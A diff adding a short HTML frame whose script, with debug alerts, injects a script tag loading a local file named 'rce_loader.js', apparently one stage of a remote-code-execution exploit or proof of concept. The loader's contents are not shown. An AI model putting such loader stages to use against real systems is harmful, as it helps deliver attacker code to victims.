@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+</head>
+<body>
+  <script type="text/javascript">
+    alert('frame.html loaded');
+    try {
+      document.write('<script defer="defer" src="./local/rce_loader.js?'+Date.now()+'"><\/script>');
+      alert('rce_loader.js script written');
+    } catch(e) {
+      alert('Error: ' + e);
+    }
+  </script>
+</body>
+</html>
